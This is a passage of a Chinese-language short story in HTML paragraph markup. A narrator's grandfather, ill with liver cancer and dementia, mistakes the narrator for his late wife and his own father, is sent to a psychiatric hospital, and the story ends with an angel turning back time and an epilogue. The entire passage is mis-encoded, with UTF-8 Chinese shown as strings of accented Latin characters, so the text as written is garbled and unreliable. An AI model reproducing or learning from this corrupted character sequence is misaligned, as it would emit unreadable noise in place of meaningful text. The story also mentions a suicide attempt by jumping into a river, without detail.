åœ¨å¢™å£ä¸Šï¼Œå‘å‡ºâ€œå®å®å½“å½“â€ç©ºçµçš„å“å£°ã€‚é•¿æ˜¥æ ‘å·²ç»é•¿å¾—è·Ÿå¢™å£ä¸€æ ·é«˜ï¼Œæ‰“å‡ºä¸€ç‰‡ç‰‡ç»¿ç»†æ²¹çš„å¶å­ï¼Œæ£•é»„çš„æ ‘å¹²è‹åŠ²æœ‰åŠ›ï¼Œå‡¹å‡¸ä¸å¹³çš„çº¹ç†æ˜¾ç¤ºç€å²æœˆçš„ç—•è¿¹ã€‚å‡ åªéº»é›€ç¯ç»•ç€æ ‘æå”±æ­Œâ€”â€”ä¸å¤šä¸å°‘ï¼Œæ­£å¥½äº”åªã€‚é‚£æ¨Ÿæ ‘å’ŒæŸ³æ ‘å‘¢ï¼Ÿæˆ‘å†å‡‘å‰ä¸€çœ‹ï¼Œé‚£é‡Œåªå‰©ä¸‹äº†ä¸¤ä¸ªæ­»æ°”æ²‰æ²‰çš„æ ‘å¢©å­ã€‚</p><p>çˆ·çˆ·å›è¿‡å¤´æ¥ï¼Œä»–çœ‹åˆ°äº†æˆ‘ã€‚ä»–è¿˜æ˜¯é‚£å¼ æ…ˆç¥¥çš„è„¸ï¼Œåªæ˜¯æœ‰é‚£æ¸©å’Œä¹‹ä¸­å¤šäº†å‡ åˆ†æ²§æ¡‘ã€‚è„¸ä¸Šé‚£äº›å±‚å±‚å å çš„è¤¶çš±ï¼Œå› ä¸ºä»–è§åˆ°æˆ‘ä¹‹åæµ®ç°çš„ç¬‘å®¹ï¼Œå˜å¾—æ›´æ·±äº†ã€‚å››ç›®ç›¸å¯¹ä¹‹æ—¶ï¼Œæˆ‘æ­£æƒ³ç€å¦‚ä½•è¡¨è¾¾å†è§åˆ°ä»–çš„æ¬£å–œä¸æ¿€åŠ¨ä¹‹æƒ…ï¼Œä»–å…ˆè¯´è¯äº†ï¼Œç”¨ä¸€ç§å¼‚å¸¸å…´å¥‹çš„è¯­è°ƒã€‚</p><p>â€œé˜¿ä¸½ï¼æ˜¯ä½ å—ï¼Œé˜¿ä¸½ï¼Ÿâ€</p><p>é˜¿ä¸½ï¼Ÿé‚£ä¸æ˜¯æˆ‘å¥¶å¥¶çš„åå­—å—ï¼Ÿ</p><p>â€œçˆ·çˆ·ï¼Œä½ è®¤é”™äº†ï¼Œæˆ‘æ˜¯æ¯›æ¯›å•Šï¼Œä¸æ˜¯â€¦â€¦â€</p><p>â€œæˆ‘å°±çŸ¥é“æˆ‘è¿˜èƒ½çœ‹è§ä½ ï¼â€ä»–ä¸€è·ƒè€Œèµ·ï¼ŒæŠŠæˆ‘æŠ±åœ¨æ€€é‡Œï¼Œâ€œé‚£äº›è€å®¶ä¼™ç¡¬è¯´åˆ°äº†å¤©å ‚ä¹Ÿåªèƒ½ä¸€ä¸ªäººç”Ÿæ´»â€”â€”æˆ‘çŸ¥é“ä»–ä»¬åœ¨éª—æˆ‘ï¼Œæ¯•ç«Ÿä»–ä»¬ä¹Ÿä¸å¸Œæœ›æˆ‘å¯»æ­»ã€‚å¯¹ä¸èµ·ï¼Œé˜¿ä¸½ã€‚æˆ‘è®©ä½ åœ¨å¤©å ‚å­¤ç‹¬åœ°å¤šå¾…äº†ä¸¤å¹´ã€‚åŸè°…æˆ‘ï¼Œå¥½å—ï¼Ÿæˆ‘çŸ¥é“ä½ å®½å®å¤§é‡ï¼Œä¸€å®šä¼šåŸè°…æˆ‘çš„ã€‚æ¯•ç«Ÿæˆ‘æ¥é™ªä½ äº†ï¼Œä¸æ˜¯å—ï¼Ÿâ€</p><p>çˆ·çˆ·é«˜å…´å¾—ä¸Šè¹¦ä¸‹è·³ï¼Œåƒä¸€ä¸ªå°å­©å­ã€‚</p><p>â€œé˜¿ä¸½ä½ çœ‹ï¼â€ä»–æŒ‡ç€é™¢å­é‡Œé‚£æ£µé•¿å¯¿æ ‘è‹—ï¼Œâ€œæ¯›æ¯›éƒ½é•¿è¿™ä¹ˆå¤§äº†ã€‚ä»–çœŸæ˜¯ä¸ªå¯çˆ±çš„å°å­©å­ã€‚ä»–è¿˜è¯´æˆ‘æ˜¯é‚£é»‘ä¸æºœç§‹çš„è€é“é”¹å‘¢ï¼â€è¿™æ—¶ä»–æŒ äº†æŒ å¤´ï¼Œæœ‰äº›ä¸å¥½æ„æ€ï¼Œâ€œæˆ‘ä¹Ÿæ„Ÿè§‰æˆ‘æ˜¯ã€‚è€å®å·´äº¤çš„ï¼Œå¸¸å—äººæ¬ºè´Ÿã€‚ä¸è¿‡ä½ ä¸å°±æ˜¯å› ä¸ºè¿™ç‚¹æ‰çˆ±ä¸Šæˆ‘çš„å—ï¼Ÿâ€</p><p>æˆ‘å¥½ä¸å®¹æ˜“ä»ä»–çš„æ€€æŠ±é‡ŒæŒ£è„±å‡ºæ¥ï¼Œç‹¼ç‹ˆåœ°è·‘å‡ºæˆ¿é—´ã€‚çˆ¸å¦ˆå·²ç»å›æ¥äº†ï¼Œæ­£åœ¨å¨æˆ¿é‡Œå‡†å¤‡æ™šé¥­ã€‚æˆ‘å‡ºæˆ¿é—´çš„æ—¶å€™ï¼Œä»–ä»¬æœæˆ‘ç‚¹ç‚¹å¤´ï¼Œç®—æ˜¯æ‰“æ‹›å‘¼äº†ã€‚</p><p>â€œçˆ·çˆ·ä»€ä¹ˆæ—¶å€™å›æ¥çš„ï¼Ÿä»–ä»Šå¤©è¯´è¯æ€ä¹ˆæ€ªæ€ªçš„ï¼Ÿâ€æˆ‘å°šæœªä»éœ‡æƒŠçš„å¿ƒæƒ…ä¸­ç¼“è¿‡ç¥æ¥ã€‚</p><p>æ¯äº²æ¯”æˆ‘è¿˜è¦éœ‡æƒŠï¼Œå¥¹æ‰‹ä¸­æ²¡å‰¥å®Œçš„æ¯›è±†ç›´æ¥æ‰åœ¨äº†åœ°ä¸Šã€‚â€œä½ è¯´ä»€ä¹ˆï¼Ÿçˆ·çˆ·è¯´è¯äº†ï¼Ÿâ€</p><p>â€œå¯¹å•Šã€‚â€æˆ‘ç”¨ä¸‰è¨€ä¸¤è¯­æŠŠçˆ·çˆ·è¯´çš„è¯é‡å¤äº†ä¸€éã€‚</p><p>çˆ¶æ¯æ„å‘³æ·±é•¿åœ°å¯¹è§†äº†ä¸€çœ¼ï¼Œéš¾æ©çœ¼ä¸­çš„æƒŠè®¶ä¹‹è‰²ã€‚</p><p>çˆ·çˆ·ä¸€å¹´å‰å°±å›æ¥äº†ã€‚ä»–ä¸æ˜¯è‡ªå·±èµ°å›æ¥çš„ï¼Œè€Œæ˜¯è¢«åˆ«äººæŠ¬å›æ¥çš„ã€‚å¤©çŸ¥é“ä»–ç¦»å¼€åŒ»é™¢é‚£ä¸¤å¹´ç»å†äº†ä»€ä¹ˆã€‚é‚£ä¸ªå¥½å¿ƒäººè¯´ï¼Œä»–çœ‹åˆ°çˆ·çˆ·åœ¨æ¡¥ä¸Šä¸€è„¸åšæ¯…åœ°è·³ä¸‹å»ï¼Œè·³è¿›æˆ‘ä»¬å®¶é™„è¿‘çš„é‚£æ¡æ²³é‡Œã€‚ä»–æŠŠä»–æ•‘äº†ä¸Šæ¥ï¼ŒæŠ¬å›æˆ‘ä»¬å®¶ã€‚ä¹‹åçˆ·çˆ·å°±ä¸€ç›´ä½åœ¨å®¶é‡Œï¼Œä½†æ˜¯ä¸€å¥è¯ä¹Ÿä¸è¯´ï¼Œå°±ç…ç€é‚£é™¢å­å‘å‘†ã€‚</p><p>â€œçˆ·çˆ·æ€ä¹ˆä¼šè·³æ²³å‘¢ï¼Ÿâ€æˆ‘ç¥è‰²å¤æ‚åœ°æœ›ç€çˆ·çˆ·æˆ¿é—´çš„é‚£æ‰‡é—¨ã€‚</p><p>â€œé‚£äººè¿˜è¯´ï¼Œä»–è·³æ²³çš„æ—¶å€™ï¼Œå¤§å–Šäº†å£°é˜¿ä¸½ã€‚â€</p><p>è¿™æ—¶çˆ·çš„å£°éŸ³é€è¿‡æˆ¿é—¨ç©¿è¿‡æ¥ï¼šâ€œé˜¿ä¸½å•Šï¼Œæˆ‘å°±ä¸è¯¥è®©ä½ å»é‚£æ²³é‡Œæ´—è¡£æœçš„ã€‚éƒ½æ€ªæˆ‘ï¼Œç©·å¾—ä¹°ä¸èµ·å¹²å‡€çš„æ°´ã€‚å¯æ˜¯ï¼Œä½ ä¹Ÿå¥½ç‹ å¿ƒã€‚â€</p><p>æˆ‘æŠŠå¤´æ’‡åˆ°ä¸€è¾¹ï¼ŒåŠªåŠ›ä¸è®©çœ¼æ³ªæµå‡ºæ¥ã€‚</p><p>â€œé™¢å­é‡Œâ€¦â€¦é‚£ä¸¤æ£µæ ‘å‘¢ï¼Ÿâ€</p><p>æ¯äº²å¹äº†å£æ°”ã€‚â€œç äº†å–é’±äº†ã€‚â€</p><p>å¤œæ·±äº†ï¼Œæˆ‘é åœ¨çª—è¾¹ï¼Œæ²¡æœ‰ç¡ã€‚æˆ‘åœ¨å·å¬çˆ¶æ¯å§å®¤çš„è°ˆè¯ã€‚ä»–ä»¬åœ¨åµæ¶ï¼Œåµå¾—å¾ˆå‡¶ã€‚ä»–ä»¬æœç„¶ä¸åƒè¡¨é¢ä¸Šé‚£ä¹ˆå’Œç¦ã€‚é™¢å­é‡Œçš„é£åœ¨ç°Œç°Œåœ°å¹ã€‚</p><p>â€œæˆ‘æ—©è·Ÿä½ è¯´è¿‡è¦æŠŠä»–é€å…»è€é™¢äº†ã€‚â€é‚£æ˜¯æ¯äº²çš„å£°éŸ³ï¼Œâ€œä½ éå¾—è®©ä»–ä½å’±å®¶ã€‚ä½ ä¹Ÿçœ‹åˆ°äº†ï¼Œæˆ‘ä»¬è¿‡å¾—æœ‰å¤šè‹¦ã€‚æˆ‘å‹‰å¼ºç­”åº”ä½ ï¼Œæ˜¯çœ‹åœ¨é‚£å¥—æŒ‚ç€ä»–åå­—çš„æˆ¿å­çš„åˆ†ä¸Šã€‚å…»ä¸ªè€äººæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå“‘å·´ä¹Ÿå°±ç®—äº†ï¼Œä»–è¿˜æ˜¯ä¸ªç²¾ç¥ç—…äººï¼æˆ‘å‘Šè¯‰ä½ ï¼Œè¿™æ¬¡ä¸€å®šè¦æŠŠä»–é€å»ç²¾ç¥ç—…é™¢ï¼â€</p><p>çˆ¶äº²å˜€å’•äº†äº›ä»€ä¹ˆï¼Œæˆ‘æ²¡æœ‰å¬æ¸…ã€‚</p><p>â€œä½ ä»¥ä¸ºçˆ±èƒ½å½“é¥­åƒå—ï¼â€æ¯äº²å«é“ï¼Œâ€œæˆ‘å‘Šè¯‰ä½ ï¼Œä½ è¦æ˜¯ä¸é€ï¼Œå’±ä»¬å°±ç¦»å©šï¼åæ­£è¿™æ—¥å­æˆ‘ä¹Ÿæ˜¯è¿‡å¤Ÿäº†ï¼â€</p><p>çˆ¶äº²æœ€ç»ˆè¿˜æ˜¯å¦¥åäº†ã€‚çˆ·çˆ·æ²¡æœ‰å¾—åˆ°åŒ»é™¢å¼€çš„è¯æ˜å°±è¢«é€å¾€äº†ç²¾ç¥ç—…é™¢ã€‚æˆ‘ç‰µç€çˆ·çˆ·çš„æ‰‹åœ¨ç—…é™¢é‡Œé€›ç€ï¼Œçœ‹ç€å½¢å½¢è‰²è‰²çš„ä¸¾æ­¢æ€ªå¼‚çš„äººï¼Œçˆ·çˆ·åœ¨ä»–ä»¬å½“ä¸­ä¹–å·§å¾—åƒä¸ªå­©å­ã€‚ä¸€æƒ³åˆ°çˆ·çˆ·ä»¥åè¦å’Œä»–ä»¬å¾…åœ¨ä¸€èµ·ï¼Œæˆ‘å†…å¿ƒå°±ä¼šæ¶Œèµ·ä¸€è‚¡è´Ÿç½ªæ„Ÿã€‚åœ¨ç¦»åˆ«ä¹‹å‰ï¼Œæˆ‘æ‰¾äº†ä¸ªå€Ÿå£ï¼Œå¸¦ç€çˆ·çˆ·å»é€›è¡—ã€‚</p><p>æˆ‘ä»¬åœ¨è¡—ä¸Šæ¼«æ­¥ï¼Œçˆ·çˆ·æœ‰æ—¶å€™å·¦é¡¾å³ç›¼ï¼Œå¥½å¥‡åœ°æœ›ç€æ©±çª—é‡Œçš„ä¸œè¥¿ï¼›æœ‰æ—¶å€™çœ¼ç¥è¿·ç¦»ï¼Œæƒ³ç€è‡ªå·±çš„å¿ƒäº‹ã€‚æˆ‘æŠŠæ¡ä½ä»–çš„é‚£åªæ‰‹ç´§äº†ç´§ï¼Œç”Ÿæ€•ä»–è·‘ä¸¢äº†ã€‚</p><p>çªç„¶ï¼Œä»–æŠ¬èµ·å¤´è¯´é“ï¼šâ€œçˆ¸çˆ¸ï¼Œä½ å›æ¥äº†ã€‚â€æˆ‘çœ‹ç€ä»–ï¼Œåœ¨ä»–çš„çœ¼ä¸­ï¼Œæˆ‘ä»¿ä½›æˆäº†é‚£ä¸ªç©¿ç€è¢«æ°´æ³¥æº…æ»¡çš„å·¥è£…çš„åˆšå›åˆ°å®¶çš„çˆ¶äº²ã€‚æˆ‘æœ‰äº›å¿ä¿Šä¸ç¦ï¼Œæ˜¨å¤©æˆäº†é˜¿ä¸½ï¼Œä»Šå¤©ä½œäº†çˆ¶äº²ï¼Œæˆ‘è¿™è¾ˆåˆ†ä¹Ÿæ˜¯è¶Šè¯´è¶Šå¤§äº†ã€‚</p><p>ç¬‘å½’ç¬‘ï¼Œæˆè¿˜æ˜¯è¦åšçš„ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“çˆ·çˆ·æ˜¯å¦æœ‰ç€æ¸…é†’çš„æ„è¯†ï¼Œè¿˜æ˜¯ä»–ç°åœ¨æ´»åœ¨è¿‡å»è®°å¿†çš„ç‰‡æ®µé‡Œã€‚â€œå—¯ï¼Œå›æ¥äº†ã€‚â€æˆ‘æŸ”å£°è¯´é“ã€‚ä»–ä¸€è„¸æ»¡è¶³åœ°ç‚¹ç‚¹å¤´ï¼Œè„šæ­¥åˆè½»çµäº†å‡ åˆ†ã€‚</p><p>ä»–æ‹½ç€æˆ‘çš„æ‰‹åœ¨è¡—ä¸Šçœ‹è¿™çœ‹é‚£ï¼Œçœ¼ç›ä¸­æ°¸è¿œå¸¦ç€æ–°å¥‡çš„å…‰èŠ’ï¼Œå¥½åƒæ˜¯ä»–ç¬¬ä¸€æ¬¡é€›è¡—ä¼¼çš„ã€‚ä»–åœ¨è¡—å¤´ä¸€ä¸ªå–æ£‰èŠ±ç³–çš„å°æ‘Šæ—ç«™äº†è®¸ä¹…ï¼Œä¸€è„¸ç—´è¿·åœ°çœ‹ç€åœ¨é‚£ä¸åœæ—‹è½¬çš„è½®ç›˜ä¸Šç»“å‡ºçš„äº”é¢œå…­è‰²çš„â€œèŠ±â€ã€‚é‚£ä¸ªæ‘Šä¸»å¼‚æ ·åœ°ç¥äº†çˆ·çˆ·ä¸€çœ¼ï¼Œä¼°è®¡æ˜¯æ²¡æƒ³åˆ°è¿™ä¹ˆå¤§å¹´çºªçš„äººç«Ÿç„¶å¯¹æ£‰èŠ±ç³–æ„Ÿå…´è¶£ã€‚</p><p>â€œçˆ¸ï¼Œç»™æˆ‘ä¹°ä¸€æœµå§ã€‚â€ä»–ç«™åœ¨é‚£é‡ŒçŠ¹è±«åŠå¤©ï¼Œæœ€ç»ˆè¿˜æ˜¯æ»¡è„¸ä¹æ±‚ä¹‹è‰²åœ°è¯´é“ã€‚</p><p>æˆ‘æ­£æ‰“ç®—åœ¨è¡£å…œé‡Œæ‰¾é’±çš„æ—¶å€™ï¼Œæ‰æ„è¯†åˆ°è‡ªå·±èº«æ— åˆ†æ–‡ã€‚æˆ‘æ‰‹è¶³æ— æªåœ°èƒ¡ä¹±æ‘¸æ‰¾ç€ï¼Œä¸€è¾¹æ©é¥°è‡ªå·±çš„å°´å°¬ç¥è‰²ï¼Œä¸€è¾¹åœ¨æƒ³ç€è‡ªå·±å¾…ä¼šå„¿è¦å¦‚ä½•å®‰æ…°è¿™ä¸ªå…­åå¤šå²çš„â€œå­©å­â€ã€‚</p><p>â€œçˆ¸ï¼â€çˆ·çˆ·çªç„¶æŠŠæ‰‹ä»æˆ‘çš„æ€€é‡ŒæŠ½èµ°ï¼ŒåŒæ‰‹æŠ±å¤´ï¼Œçœ¼ç›é‡Œæ»¡æ˜¯æƒŠæä¸æ‡Šæ‚”ã€‚ä»–é‚£ç¾¸å¼±çš„èº«å­èœ·ç¼©ç€ï¼Œåœ¨é£’é£’çš„å‡‰é£ä¸­æ˜¾å¾—å•è–„ã€æ— åŠ›è€Œåˆä»¤äººåŒæƒ…ã€‚æˆ‘çœ‹ç€ä»–ï¼Œä¸çŸ¥é“å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p><p>â€œçˆ¸ï¼åˆ«æ‰“æˆ‘äº†ï¼Œçˆ¸ï¼â€ä»–ä¸€ä¸ªäººåœ¨ç©ºåœ°ä¸Šå·¦èº²å³é—ªï¼Œçœ¼ç›éšåœ¨é®æ©çš„åŒè‡‚èƒŒåã€‚ä»–ä»¿ä½›çœ‹åˆ°ä»–çˆ¶äº²çš„æ‹³å¤´æ— æƒ…åœ°è½åœ¨ä»–èº«ä¸Šï¼Œâ€œæˆ‘çŸ¥é“é”™äº†ï¼Œæˆ‘ä¸ä¹°äº†ï¼ä¸ä¹°äº†!â€</p><p>è¯´å®Œè¿™è¯çš„æ—¶å€™ï¼Œä»–ä¸å†é—ªèº²ã€‚ä»–æ¸æ¸æŠŠæ‰‹æ”¾ä¸‹ï¼Œä¸€è„¸ç•æƒ§åœ°çœ‹ç€æˆ‘ç«™çš„ä½ç½®ã€‚æˆ‘çœ‹åˆ°æœ‰ä»€ä¹ˆæ™¶è¹çš„ä¸œè¥¿åœ¨ä»–çš„çœ¼è§’é—ªäº†ä¸€ä¸‹ã€‚â€œå‘œå‘œâ€”â€”â€æ³ªæ°´å¤ºçœ¶è€Œå‡ºï¼Œåœ¨ä»–æ»¡æ˜¯çš±çº¹çš„æ²Ÿå£‘ä¸­å †ç Œï¼Œç„¶åé¡ºç€è„¸é¢Šå¤–æ²¿åœ¨ä¸‹å·´å¤„æ±‡èšï¼Œæ¸…è„†åœ°æ‰“åœ¨åœ°ä¸Šã€‚ä»–çš„è‚©è†€ä¸€è€¸ä¸€è€¸ç€ï¼Œé¥±ç»é£éœœçš„è„¸æ‰­æ›²ç€ï¼Œå°å­©å­èˆ¬å§”å±ˆçš„ç¥è‰²ä¸å’Œè°åœ°åµŒå°åœ¨è‹è€çš„é¢é¢Šä¸Šï¼Œè¿™ä¸€å¹•æå¯Œæˆå‰§æ€§å´åˆè®©äººç¬‘ä¸å‡ºæ¥ã€‚</p><p>çˆ·çˆ·å“­äº†ï¼Œæˆ‘ä¹Ÿå“­äº†ã€‚æˆ‘ä»¬ä¿©å¤´é ç€å¤´ååœ¨å°é˜¶ä¸Šï¼Œä»–å“­â€œæˆ‘â€çš„æ— æƒ…ï¼Œæˆ‘å“­ä»–çš„æ— åŠ©ã€‚ä»–æ³ªçœ¼å©†å¨‘åœ°çœ‹ç€æˆ‘ï¼Œæƒ³èµ·äº†ä»–çš„çˆ¶äº²ï¼Œä»–çš„ç«¥å¹´ï¼Œä»–çš„é˜¿ä¸½ï¼Œä»–çš„ç—›è‹¦ï¼›è€Œæˆ‘æ³ªçœ¼å©†å¨‘åœ°çœ‹çœ‹ä»–ï¼Œæƒ³èµ·äº†é‚£ä»æ‘‡æ¤…ä¸Šç«™èµ·æ¥æ¡è¯çš„èº«å½±ï¼Œé‚£åœ¨åŒ»ç”Ÿæ€€é‡Œæ‹½ç€è¢«å•çš„èº«å½±ï¼Œé‚£æ’ç€ç®¡å­èººåœ¨ç—…åºŠä¸Šçš„èº«å½±ï¼Œé‚£ç•™ä¸‹è½å¯èƒŒå½±çš„èµ°å‡ºåŒ»é™¢å¤§é—¨çš„èº«å½±ã€‚ä»–å“­å¾—å·®ä¸å¤šäº†ï¼Œçœ‹åˆ°æˆ‘å“­ï¼Œåˆå¿ä¸ä½å·å••èµ·æ¥ã€‚ä¸€ç›´åˆ°å¤ªé˜³å¿«è½çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ‰åœä¸‹æ¥ã€‚æˆ‘ä¼¸æ‰‹æ“¦äº†æ“¦æ®‹ç•™åœ¨ä»–çœ¼è§’çš„æ³ªç ï¼Œç„¶åæŠŠä»–é€å›ç—…é™¢ã€‚å›åˆ°å®¶æ—¶ï¼Œæˆ‘æŠŠè‡ªå·±åé”åœ¨çˆ·çˆ·çš„æˆ¿é—´é‡Œï¼Œå†ä¸€æ¬¡å·å••å¤§å“­ã€‚</p><p>æ™šä¸Šï¼Œæˆ‘è®©çª—å¸˜å¼€ç€ã€‚æ»¡æœˆçš„å…‰è¾‰ä¸€å±‚åˆä¸€å±‚åœ°é“ºæ»¡æˆ¿é—´ã€‚é“é”¹â€œå®å½“â€çš„å£°éŸ³å›è¡åœ¨é™¢å­é‡Œï¼Œé£åˆç´§äº†äº›ï¼Œå¹å¾—é•¿å¯¿æ ‘è‹—ä¸œå€’è¥¿æ­ªã€‚æˆ‘èººåœ¨æ‘‡æ¤…ä¸Šï¼ŒåŒçœ¼çš„çº¢è‚¿è¿˜æœªè¤ªå»ã€‚ç–²æƒ«çˆ¬ä¸Šäº†æˆ‘çš„èº«ä½“ã€‚</p><p>â€œä½ æ‰¾æˆ‘ï¼Ÿâ€é‚£ä¸ªå¤©ä½¿å‡ºç°åœ¨æˆ‘çš„é¢å‰ã€‚å¥¹ä¸€è„¸æ…ˆç¥¥åœ°ç«™åœ¨æœˆå…‰ä¸‹ï¼Œæ™¯æ˜¯ä¸‰å¹´å‰çš„æ™¯ï¼Œå¯äººå·²ä¸æ˜¯ä¸‰å¹´å‰çš„äººã€‚</p><p>æˆ‘å‘¼å‡ºä¸€å£æµŠæ°”ï¼ŒåŒçœ¼è¿·ç¦»ã€‚</p><p>â€œæ€ä¹ˆï¼Œåæ‚”äº†ï¼Ÿâ€å¥¹ç¼“ç¼“è½åœ°ï¼Œåœ¨æˆ‘èº«è¾¹åä¸‹ã€‚æˆ‘é‡é‡åœ°ç‚¹äº†ç‚¹å¤´ã€‚</p><p>â€œè®²ç‚¹ä»€ä¹ˆå§ã€‚â€å¥¹é‚£æŸ”å’Œçš„å£°éŸ³å®›å¦‚å¤©ç±ï¼ŒæŠšå¹³æˆ‘å†…å¿ƒç¹æ‚çš„æ€ç»ªã€‚</p><p>â€œæˆ‘çœŸçš„â€¦â€¦å¤ªè‡ªç§äº†ã€‚â€ä¸€å¥è¯æ²¡è¯´å®Œï¼Œæˆ‘å°±æ­¢ä¸ä½åœ°å“½å’½èµ·æ¥ã€‚å¥¹å°±é™é™åœ°åç€ã€‚æˆ‘å¥½ä¸å®¹æ˜“æ‰æŠŠæƒ…ç»ªå¹³ç¨³ä¸‹æ¥ã€‚â€œçˆ·çˆ·å…¶å®å·´ä¸å¾—æ—©ç‚¹èµ°ï¼Œè€Œæˆ‘å´å› ä¸ºè‡ªå·±æ²¡äººé™ªä¼´è€Œç¡¬æŠŠä»–ç•™äº†ä¸‹æ¥ã€‚ä»–æ­»å‰å·²ç»çœ‹å¼€äº†ï¼Œä»–ä¸æ„¿å†ä½“ä¼šäººæƒ…çš„å†·æ¼ ï¼Œå› è€Œé€‰æ‹©äº†æ­»äº¡ã€‚å“ï¼Œä»–è‚¯å®šçŸ¥é“ï¼Œä»–çš„å­˜åœ¨æ˜¯æˆ‘ä»¬å®¶å’Œå§‘å§‘å®¶ç”Ÿæ´»ä¸‹å»æœ€å¤§çš„é˜»ç¢äº†ã€‚â€</p><p>â€œçˆ·çˆ·è¿™ä¸€ç”Ÿè¿‡çš„è‚¯å®šå¾ˆè‹¦ã€‚å°æ—¶å€™ä»–çˆ¸ä¸ç»™ä»–ä¹°æ£‰èŠ±ç³–ï¼Œç»“å©šäº†ä»–åˆä¸ºç”Ÿè®¡æ‰€å›°ï¼Œå¥¶å¥¶åˆèµ°å¾—æ—©ï¼Œä»–åˆå¾—äº†è‚ç™Œã€æˆäº†ç´¯èµ˜ï¼Œæ­»äº¡æ˜¯å¤šä¹ˆå¯é‡ä¸å¯æ±‚çš„è§£è„±å•Šï¼â€æˆ‘ä½ä¸‹å¤´ï¼Œé¢¤æŠ–ç€ï¼Œâ€œæˆ‘æ¨æˆ‘è‡ªå·±ï¼Œè®©ä»–æ´»åœ¨äº†æ°¸æ— æ­¢å¢ƒçš„ç—›è‹¦ä¹‹ä¸­ã€‚â€</p><p>â€œä½ æ˜ç™½äº†ã€‚â€å¥¹è½»å£°è¯´ç€ã€‚</p><p>â€œæˆ‘æ¨æˆ‘è‡ªå·±æ²¡èƒ½æ˜ç™½å¾—æ—©äº›ã€‚â€</p><p>å¥¹ç¥è‰²å¤æ‚åœ°æœ›ç€æˆ‘ï¼Œæ²‰é»˜è‰¯ä¹…ã€‚</p><p>â€œå°æ—¶å€™æˆ‘æ˜¯å¤šä¹ˆç›¼ç€é•¿å¤§å•Šã€‚å¯é•¿å¤§ä¹‹åï¼Œå°æ—¶å€™çš„æ— å¿§æ— è™‘å·²ç»å†ä¹Ÿå›ä¸æ¥äº†ã€‚â€æˆ‘æŠŠè„¸åŸ‹åœ¨æ‰‹é‡Œï¼Œâ€œåŸæ¥ï¼Œæ— çŸ¥æ˜¯ä¸€ç§å¹¸ç¦ã€‚å”¯ä¸€é—æ†¾çš„æ˜¯ï¼Œè¿™ç§å¹¸ç¦å´æ˜¯ä»¥ä»–äººçš„ç—›è‹¦ä¸ºä»£ä»·ã€‚â€</p><p>å¥¹æŠŠæˆ‘æŠ±åœ¨æ€€é‡Œï¼Œæˆ‘çœ‹ç€é™¢å­é‡Œé‚£æ£µæ»¡æ˜¯åˆ®ç—•çš„é•¿å¯¿æ ‘ï¼Œæ ‘å¶åœ¨é£ä¸­é¢¤æŠ–ç€ï¼Œä»¿ä½›èƒ½æ„Ÿå—åˆ°æˆ‘çš„æ‚²ä¼¤ä¼¼çš„ã€‚</p><p>â€œæˆ‘å¤šä¹ˆå¸Œæœ›è¿™æ˜¯ä¸€åœºæ¢¦ã€‚ä¸€è§‰é†’æ¥ï¼Œå›åˆ°ä¸‰å¹´ä¹‹å‰ã€‚â€æˆ‘å–ƒå–ƒç€ã€‚</p><p>å¥¹çªç„¶ç¬‘äº†ï¼Œç¬‘å¾—å¾ˆç¿çƒ‚ï¼šâ€œè¿™ä¸ªæ„¿æœ›ï¼Œæˆ‘å¯ä»¥å¸®ä½ å®ç°ã€‚â€</p><p>å¤©äº®äº†ï¼Œé˜³å…‰æ´’äº†è¿›æ¥ã€‚æ•²é—¨å£°çªå…€åœ°å“èµ·ï¼Œæˆ‘å¼€äº†é—¨ï¼Œçœ‹åˆ°å§‘å§‘å’Œçˆ¶æ¯ç©¿ç€é»‘è‰²å­è¡£ç«™åœ¨æˆ‘é¢å‰ã€‚</p><p>â€œèµ¶ç´§ç©¿ä¸Šå­è¡£ï¼Œæˆ‘ä»¬é©¬ä¸Šå»åŒ»é™¢ã€‚â€æ¯äº²å‚¬ä¿ƒç€ã€‚æˆ‘ç¥è§äº†å®¢å…é‡Œé‚£å£æ£ºæã€‚</p><p>â€œçˆ·çˆ·å‘¢ï¼Ÿâ€æˆ‘éšæ™¦åœ°éœ²å‡ºä¸€ä¸å¾®ç¬‘ã€‚</p><p>â€œä½ è¿™å°å­ï¼Œå“­ç³Šæ¶‚äº†å§ï¼â€å§‘å§‘æ’å˜´é“ï¼Œâ€œæ˜¨å¤©ä½ ä¸åœ¨æ€¥è¯Šå®¤çœ‹ä»–æ¥ç€ï¼Ÿâ€</p><p>â€œä»–çš„ç—…å¥½äº†æ²¡ï¼Ÿâ€</p><p>â€œå¼€ç©ç¬‘ï¼Œè‚ç™Œæ²¡æ¶åŒ–å°±å·²ç»ä¸‡äº‹å¤§å‰äº†ï¼Œä½ è¿˜æŒ‡æœ›ä»–èƒ½å¥½ï¼Ÿâ€å§‘å§‘æ²¡å¥½æ°”åœ°è¯´é“ï¼Œâ€œåŠ¨ä½œåˆ©ç´¢ç‚¹ï¼â€</p><h1 id="å°¾å£°">å°¾å£°</h1><p>éº»é›€æ˜¾ç„¶ä¸çŸ¥é“ä»Šå¤©æ˜¯ä»€ä¹ˆé‡è¦çš„æ—¥å­ã€‚è¡—ä¸Šé”£é¼“æ•²å¾—éœ‡å¤©å“ï¼Œå®³å¾—å®ƒä»¬éƒ½ä¸èƒ½ç¡ä¸ªå¥½è§‰ã€‚å‡ åªéº»é›€ç»•ç€æ¨Ÿæ ‘å’ŒæŸ³æ ‘ï¼Œå½å½å–³å–³åœ°åœ¨å®£æ‰¬å®ƒä»¬çš„ä¸æ»¡ã€‚</p><p>é™¢å­é‡Œèµ°è¿›æ¥ä¸€å¯¹æ¯å­ï¼Œå°å­©å­åœ¨å“­ï¼Œè€Œæ¯äº²åœ¨å®‰æ…°ä»–ã€‚</p><p>â€œå‚»å­©å­ï¼Œåˆ«å“­äº†ï¼Œä¸€åˆ‡éƒ½ä¼šè¿‡å»çš„ã€‚â€æ¯äº²æŠ¹å»ä»–çœ¼è§’çš„çœ¼æ³ªï¼Œå¥¹çš„è¯­æ°”ä¸­å¸¦æœ‰ä¸€ä¸è‡ªè±ªï¼Œä¸ºå¥¹å„¿å­çš„å­å¿ƒè€Œè‡ªè±ªã€‚å§‘å§‘ç«™åœ¨é™¢å­é—¨å£ï¼Œæ»¡è„¸çš„å¿§æ„ã€‚</p><p>æ¯äº²å’Œå­©å­èµ°åˆ°é‚£ä¸‰æ£µæ ‘å‰ã€‚æ¯äº²æŠšæ‘¸ç€é‚£æ£µå°šå¹¼çš„é•¿å¯¿æ 